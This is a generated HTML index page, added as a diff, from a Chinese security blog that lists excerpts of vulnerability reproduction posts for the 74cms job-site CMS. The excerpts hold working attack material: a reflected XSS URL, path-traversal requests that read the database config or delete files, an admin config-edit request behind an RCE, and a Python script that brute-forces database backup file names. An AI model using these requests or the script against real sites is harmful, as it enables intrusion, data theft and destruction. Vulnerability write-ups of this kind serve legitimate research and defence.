@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/100/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-74cms/（CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/74cms/%EF%BC%88CVE-2019-11374%EF%BC%8974cms%20v5.0.1%20%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0(CSRF)%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.472Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-11374）74cms-v5-0-1-后台跨站请求伪造-CSRF-漏洞"><a href="#（CVE-2019-11374）74cms-v5-0-1-后台跨站请求伪造-CSRF-漏洞" class="headerlink" title="（CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞"></a>（CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在74CMS<br>v5.0.1后台存在一个跨站请求伪造(CSRF)漏洞，该漏洞url：<code>/index.php?m=admin&amp;c=admin&amp;a=add</code>攻击者可以利用该漏洞诱骗管理员点击恶意页面，从而任意添加一个后台管理员账户，达到进入后台，获得一个后台管理员角色的控制权。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74CMS v5.0.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先我们登录后台页面，并添加管理员，然后添加信息，用burp_suite抓包</p>
+<p>1.png</p>
+<p>当管理员登录后台后，点击攻击者发来的连接即可创建一个新的超级管理员账户</p>
+<p>2.png</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/74cms/%EF%BC%88CVE-2019-11374%EF%BC%8974cms%20v5.0.1%20%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0(CSRF)%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/74cms/%EF%BC%88CVE-2019-11374%EF%BC%8974cms%20v5.0.1%20%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0(CSRF)%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlbk000oy8v1avhocv1r" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-74cms/74cms v6.0.48模版注入+文件包含getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/74cms/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.470Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="74cms-v6-0-48模版注入-文件包含getshell"><a href="#74cms-v6-0-48模版注入-文件包含getshell" class="headerlink" title="74cms v6.0.48模版注入+文件包含getshell"></a>74cms v6.0.48模版注入+文件包含getshell</h1><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>骑士cms人才系统，是一项基于PHP+MYSQL为核心开发的一套<strong>免费 +</strong> 开源专业人才网站系统。软件具执行效率高、模板自由切换、后台管理功能方便等诸多优秀特点。</p>
+<h2 id="0x02-漏洞概述"><a href="#0x02-漏洞概述" class="headerlink" title="0x02 漏洞概述"></a>0x02 漏洞概述</h2><p>骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。</p>
+<h2 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h2><p>骑士 CMS &lt; 6.0.48</p>
+<p><strong>0x04 环境搭建</strong></p>
+<p>骑士cms不支持php7.0，所以建议使用php5</p>
+<p>官网下载6.0.20版本</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/74cms/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/74cms/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/" data-id="cl5c2qlbj000ny8v152i95tsg" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-74cms/74cms v6.0.4 反射型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/74cms/74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.467Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="74cms-v6-0-4-反射型xss"><a href="#74cms-v6-0-4-反射型xss" class="headerlink" title="74cms v6.0.4 反射型xss"></a>74cms v6.0.4 反射型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v6.0.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://www.0-sec.org/index.php?m=&amp;c=help&amp;a=help_list&amp;key=137244gq1lw%253cscript%253ealert%25281%2529%253c%252fscript%253edutvxlqd4lq&amp;__hash__=d7aa5a382f14d270c3ac4de8392b4e1d_a34adb2b339972672eb447276f69ee88
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/74cms/74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/74cms/74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" data-id="cl5c2qlbi000ly8v122t300c0" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-74cms/74cms v5.0.1远程执行代码" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/74cms/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.464Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="74cms-v5-0-1远程执行代码"><a href="#74cms-v5-0-1远程执行代码" class="headerlink" title="74cms v5.0.1远程执行代码"></a>74cms v5.0.1远程执行代码</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v5.0.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="/resource/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId25.png"></p>
+<pre><code>POST /74cms/index.php?m=Admin&amp;c=config&amp;a=edit HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/74cms/index.php?m=Admin&amp;c=Config&amp;a=index
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 391
+Connection: close
+Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
+
+site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&amp;site_domain=127.0.0.1&amp;site_dir=%2F74cms%2F&amp;top_tel=000-00000000&amp;bootom_tel=000-00000000&amp;contact_email=&amp;address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&amp;bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&amp;icp=icp000000000&amp;isclose=0&amp;close_reason=&amp;statistics=&amp;logo_home=&amp;logo_other=
+</code></pre>
+<p>c=config&amp;a=edit -&gt; Controller=config&amp;action=edit -&gt;<br>/Application/Admin/Controller/ConfigController.class.php Line 9:<br>I(&#39;request.site_domain&#39;,&#39;&#39;,&#39;trim&#39;) -&gt; trim($site_domain,&#39;/&#39;)<br>-&gt; &#39;.&#39;.implode(&#39;.&#39;,$domain) -&gt; array(&#39;domain&#39;=&gt;$domain) -&gt;<br>$this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;)</p>
+<pre><code>public function edit()&#123;
+       if(IS_POST)&#123;
+           $site_domain = I(&#39;request.site_domain&#39;,&#39;&#39;,&#39;trim&#39;);
+           $site_domain = trim($site_domain,&#39;/&#39;);
+           $site_dir = I(&#39;request.site_dir&#39;,C(&#39;qscms_site_dir&#39;),&#39;trim&#39;);
+           $site_dir = $site_dir==&#39;&#39;?&#39;/&#39;:$site_dir;
+           $site_dir = $site_dir==&#39;/&#39;?$site_dir:(&#39;/&#39;.trim($site_dir,&#39;/&#39;).&#39;/&#39;);
+           $_POST[&#39;site_dir&#39;] = $site_dir;
+           if($site_domain &amp;&amp; $site_domain != C(&#39;qscms_site_domain&#39;))&#123;
+               if($site_domain == C(&#39;qscms_wap_domain&#39;))&#123;
+                   $this-&gt;returnMsg(0,&#39;主域名不能与触屏版域名重复！&#39;);
+               &#125;
+               $str = str_replace(&#39;http://&#39;,&#39;&#39;,$site_domain);
+               $str = str_replace(&#39;https://&#39;,&#39;&#39;,$str);
+               if(preg_match(&#39;/com.cn|net.cn|gov.cn|org.cn$/&#39;,$str) === 1)&#123;
+                   $domain = array_slice(explode(&#39;.&#39;, $str), -3, 3);
+               &#125;else&#123;
+                   $domain = array_slice(explode(&#39;.&#39;, $str), -2, 2);
+               &#125;
+               $domain = &#39;.&#39;.implode(&#39;.&#39;,$domain);
+               $config[&#39;SESSION_OPTIONS&#39;] = array(&#39;domain&#39;=&gt;$domain);
+               $config[&#39;COOKIE_DOMAIN&#39;] = $domain;
+               $this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;);
+           &#125;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/74cms/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/74cms/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" data-id="cl5c2qlbi000my8v1fsni76ia" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-74cms/74cms v5.0.1前台sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/74cms/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.461Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="74cms-v5-0-1-前台sql注入"><a href="#74cms-v5-0-1-前台sql注入" class="headerlink" title="74cms v5.0.1 前台sql注入"></a>74cms v5.0.1 前台sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="具体信息"><a href="#具体信息" class="headerlink" title="具体信息"></a>具体信息</h3><p>文件位置：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php</p>
+<p>方法：function company_focus($company_id)</p>
+<p>是否需登录：需要</p>
+<p>登录权限：普通用户即可</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/74cms/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/74cms/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qlbh000ky8v12qv16hsl" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-74cms/74cms v4.2.3 备份文件爆破" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/74cms/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.457Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="74cms-v4-2-3-备份文件爆破"><a href="#74cms-v4-2-3-备份文件爆破" class="headerlink" title="74cms v4.2.3 备份文件爆破"></a>74cms v4.2.3 备份文件爆破</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code># -*- coding: utf-8 -*-
+-------------------------------------------------
+   File Name：     74cms_MysqlBak
+   Description :
+   Author :       CoolCat
+   date：          2019/1/5
+-------------------------------------------------
+   Change Activity:
+                   2019/1/5:
+-------------------------------------------------
+&quot;&quot;&quot;
+__author__ = &#39;CoolCat&#39;
+
+import requests
+
+def getBak(time):
+    print(&quot;[running]:正在查询&quot; + time + &quot;是否存在备份&quot;)
+    dir = time + &quot;_1&quot;
+    filename = dir + &quot;_1.sql&quot;
+    url = target + &quot;//data/backup/database/&quot; + dir +&quot;/&quot;+ filename
+    session = requests.Session()
+    headers = &#123;&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,
+               &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
+               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0&quot;,
+               &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Language&quot;: &quot;en&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;&#125;
+    cookies = &#123;&quot;think_language&quot;: &quot;en&quot;, &quot;think_template&quot;: &quot;default&quot;, &quot;PHPSESSID&quot;: &quot;6d86a34ec9125b2d08ebbb7630838682&quot;&#125;
+    response = session.get(url=url, headers=headers, cookies=cookies)
+    if response.status_code == 200:
+        print(url)
+        exit()
+
+if __name__ == &#39;__main__&#39;:
+
+    global target
+    target = &quot;http://www.target.com&quot;
+
+    for year in range(2017, 2020):
+        for mouth in range(1, 13):
+            for day in range(1, 31):
+                time = (str(year) + str(&#39;%02d&#39; % mouth) + str(&#39;%02d&#39; % day))
+                getBak(time)
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/74cms/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/74cms/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/" data-id="cl5c2qlbh000jy8v11wpsd4s8" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-74cms/74cms v4.2.3 任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/74cms/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.454Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="74cms-v4-2-3任意文件读取"><a href="#74cms-v4-2-3任意文件读取" class="headerlink" title="74cms v4.2.3任意文件读取"></a>74cms v4.2.3任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v4.2.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>先尝试读取 db.php，向服务器post如下数据</p>
+<pre><code>POST /index.php?m=&amp;c=members&amp;a=register HTTP/1.1
+Host: www.0-sec.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku
+Content-Type: application/x-www-form-urlencoded
+
+ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind
+</code></pre>
+<p>会返回如下数据</p>
+<p>1.png</p>
+<p>在/data/upload/avatar/年月/日文件夹下 会生成一张图片</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/74cms/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/74cms/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2qlbg000iy8v1dn7gcoj1" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-74cms/74cms v4.2.3 任意文件删除" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/74cms/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.449Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="74cms-v4-2-3-任意文件删除"><a href="#74cms-v4-2-3-任意文件删除" class="headerlink" title="74cms v4.2.3 任意文件删除"></a>74cms v4.2.3 任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>GET /index.php?m=admin&amp;c=database&amp;a=del&amp;name=/../../../../../ HTTP/1.1
+Host: 0-sec.org
+User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/index.php?m=admin&amp;c=database&amp;a=restore
+Connection: close
+Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
+Upgrade-Insecure-Requests: 1
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/74cms/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/74cms/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" data-id="cl5c2qlbg000hy8v1ep0z5nhu" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-74cms/74cms v4.2.126-通杀sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/74cms/74cms%20v4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.445Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="74cms-v4-2-126-通杀sql注入"><a href="#74cms-v4-2-126-通杀sql注入" class="headerlink" title="74cms v4.2.126-通杀sql注入"></a>74cms v4.2.126-通杀sql注入</h1><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" href="http://www.74cms.com/download/index.html">http://www.74cms.com/download/index.html</a></p>
+<p>关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。</p>
+<p>注：此漏洞不用升级至最新版本也可使用。</p>
+<h1 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h1><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为  <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h1 id="0x02-数据填充不然没得测试"><a href="#0x02-数据填充不然没得测试" class="headerlink" title="0x02 数据填充不然没得测试"></a>0x02 数据填充不然没得测试</h1><p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
+<h2 id="0x02-1注册商家账号方便测试"><a href="#0x02-1注册商家账号方便测试" class="headerlink" title="0x02.1注册商家账号方便测试"></a>0x02.1注册商家账号方便测试</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/74cms/74cms%20v4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/74cms/74cms%20v4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qlbe000gy8v19uq2fpzm" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-74cms/74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/74cms/74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.441Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
